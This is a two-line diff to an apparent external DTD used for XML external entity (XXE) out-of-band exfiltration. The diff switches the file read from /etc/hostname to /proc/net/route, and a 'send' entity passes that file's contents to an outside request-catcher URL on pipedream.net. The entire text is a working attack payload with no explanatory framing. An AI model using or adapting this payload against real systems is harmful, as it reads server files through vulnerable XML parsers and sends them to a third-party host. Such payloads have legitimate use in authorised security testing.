@@ -1,2 +1,2 @@
-<!ENTITY % file SYSTEM "file:///etc/hostname">
+<!ENTITY % file SYSTEM "file:///proc/net/route">
 <!ENTITY % all "<!ENTITY &#37; send SYSTEM 'https://enirkytuv22o.x.pipedream.net/?%file;'>">
